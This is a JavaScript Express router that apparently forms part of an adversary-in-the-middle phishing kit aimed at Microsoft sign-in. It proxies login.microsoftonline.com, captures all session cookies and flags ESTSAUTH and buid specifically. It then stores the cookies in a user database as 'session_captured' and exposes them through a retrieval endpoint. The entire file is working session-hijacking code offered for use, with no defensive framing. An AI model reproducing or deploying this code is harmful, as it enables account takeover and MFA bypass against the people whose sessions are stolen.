const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const User = require('../models/user');
const { setMFAStatus } = require('./mfa-status');

const router = express.Router();

// Store cookies from user sessions
const userSessions = new Map();

// Enhanced Microsoft proxy that captures ALL authentication cookies
const cookieCapturingProxy = createProxyMiddleware({
  target: 'https://login.microsoftonline.com',
  changeOrigin: true,
  pathRewrite: { '^/auth-capture': '' },
  
  onProxyRes: function (proxyRes, req, res) {
    const userId = req.query.userId || req.headers['x-user-id'];
    
    // Capture ALL Set-Cookie headers from Microsoft
    const setCookies = proxyRes.headers['set-cookie'];
    if (setCookies && userId) {
      const existingCookies = userSessions.get(userId) || [];
      
      setCookies.forEach(cookieStr => {
        const cookie = parseCookie(cookieStr);
        console.log(`🍪 Intercepted: ${cookie.name} = ${cookie.value.substring(0, 50)}...`);
        
        // Store ALL Microsoft cookies, not just filtered ones
        const existingIndex = existingCookies.findIndex(c => c.name === cookie.name);
        if (existingIndex >= 0) {
          existingCookies.splice(existingIndex, 1);
        }
        existingCookies.push(cookie);
      });
      
      userSessions.set(userId, existingCookies);
      
      // Check for ESTSAUTH cookies specifically
      const hasESTS = existingCookies.some(c => c.name.startsWith('ESTSAUTH'));
      const hasBUID = existingCookies.some(c => c.name === 'buid');
      
      if (hasESTS && hasBUID) {
        console.log(`✅ ESTSAUTH cookies captured for user ${userId}`);
        saveUserCookies(userId, existingCookies);
      }
    }
  }
});

// Parse cookie string into object
function parseCookie(cookieStr) {
  const parts = cookieStr.split(';');
  const [nameValue] = parts[0].split('=');
  const name = nameValue;
  const value = parts[0].substring(name.length + 1);
  
  const cookie = { name, value };
  
  parts.slice(1).forEach(part => {
    const [key, val] = part.trim().split('=');
    switch(key.toLowerCase()) {
      case 'domain': cookie.domain = val; break;
      case 'path': cookie.path = val; break;
      case 'secure': cookie.secure = true; break;
      case 'httponly': cookie.httpOnly = true; break;
      case 'expires': cookie.expires = new Date(val); break;
    }
  });
  
  return cookie;
}

// Check if we have complete authentication with ESTSAUTH
function hasCompleteAuth(cookies) {
  const hasESTS = cookies.some(c => c.name.startsWith('ESTSAUTH'));
  const hasBUID = cookies.some(c => c.name === 'buid');
  return hasESTS && hasBUID;
}

// Save cookies to database
async function saveUserCookies(userId, cookies) {
  try {
    const formattedCookies = cookies.map(cookie => ({
      domain: cookie.domain || '.login.microsoftonline.com',
      httpOnly: cookie.httpOnly || false,
      path: cookie.path || '/',
      secure: cookie.secure || true,
      expiry: cookie.expires ? Math.floor(cookie.expires.getTime() / 1000) : 0,
      name: cookie.name,
      value: cookie.value
    }));
    
    await User.findByIdAndUpdate(userId, {
      sessionCookies: formattedCookies,
      allCookies: formattedCookies,
      cookieStatus: "session_captured",
      isActive: true,
      lastLogin: new Date()
    });
    
    console.log(`💾 Saved ${cookies.length} cookies for user ${userId}`);
  } catch (error) {
    console.error('Error saving cookies:', error);
  }
}

// Endpoint to get captured cookies
router.get('/cookies/:userId', (req, res) => {
  const { userId } = req.params;
  const cookies = userSessions.get(userId) || [];
  res.json({ cookies, hasAuth: hasCompleteAuth(cookies) });
});

// Microsoft auth proxy
router.use('/', cookieCapturingProxy);

module.exports = router;